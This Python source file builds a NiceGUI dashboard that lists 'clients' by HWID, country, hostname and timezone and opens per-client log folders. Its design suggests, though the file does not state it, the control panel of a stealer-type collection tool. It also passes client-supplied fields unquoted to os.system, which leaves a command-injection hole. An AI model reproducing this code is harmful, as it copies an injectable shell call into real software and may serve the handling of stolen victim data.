import os

import aiosqlite

from nicegui import ui

columns = [
    {
        "name": "id",
        "label": "ID",
        "field": "id",
        "required": True,
        "sortable": True,
    },
    {
        "name": "hwid",
        "label": "HWID",
        "field": "hwid",
        "required": True,
        "sortable": True,
    },
    {
        "name": "country_code",
        "label": "Country Code",
        "field": "country_code",
        "required": True,
        "sortable": True,
    },
    {
        "name": "hostname",
        "label": "Hostname",
        "field": "hostname",
        "required": True,
        "sortable": True,
    },
    {
        "name": "date",
        "label": "Date",
        "field": "date",
        "required": True,
        "sortable": True,
    },
    {
        "name": "timezone",
        "label": "Timezone",
        "field": "timezone",
        "required": True,
        "sortable": True,
    },
]


async def clients_page_stuff(db_path: str) -> None:
    """Clients page to view the clients that have connected to the server."""
    data = []
    seen_entries = set()

    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute("SELECT * FROM entries")
        rows = await cursor.fetchall()
        await cursor.close()

        for row in rows:
            new_data = {
                "id": row[0],
                "hwid": row[1],
                "country_code": row[2],
                "hostname": row[3],
                "date": row[4],
                "timezone": row[5],
            }

            new_data_tuple = tuple(new_data.items())

            if new_data_tuple not in seen_entries:
                seen_entries.add(new_data_tuple)
                data.append(new_data)

    with ui.card().classes(
        "w-full h-full justify-center no-shadow border-[1px] border-gray-200 rounded-lg"
    ):
        ui.label("Clients page").classes("text-6xl w-full text-center font-bold")
        with ui.table(columns, rows=data, pagination=10, selection="single").classes(
            "h-full w-full bordered"
        ) as table:
            with table.add_slot("bottom-row"):
                with table.row():
                    with table.cell():
                        ui.button("Open").on_click(
                            lambda: open_in_explorer(
                                os.path.join(
                                    os.path.dirname(db_path),
                                    "logs",
                                    str(table.selected[0]["hwid"]),
                                    f"{table.selected[0]['country_code']}-({table.selected[0]['hostname']})-({table.selected[0]['date']})-({table.selected[0]['timezone']})",
                                )
                            )
                        ).bind_visibility_from(
                            table, "selected", backward=lambda val: bool(val)
                        ).props(
                            "flat fab-mini"
                        )
                        ui.button("Remove").on_click(
                            lambda: remove_entry(table.selected[0]["id"], db_path)
                        ).bind_visibility_from(
                            table, "selected", backward=lambda val: bool(val)
                        ).props(
                            "flat fab-mini"
                        )


def open_in_explorer(path: str) -> None:
    """Open the folder in the explorer."""
    os.system(f"explorer {path}")


def remove_entry(id: int, db_path: str) -> None:
    """Remove an entry from the database."""

    async def remove_entry_async(id: int, db_path: str) -> None:
        async with aiosqlite.connect(db_path) as db:
            await db.execute("DELETE FROM entries WHERE id=?", (id,))
            await db.commit()

    ui.confirm(
        "Are you sure you want to remove this entry?",
        on_confirm=lambda: remove_entry_async(id, db_path),
    )
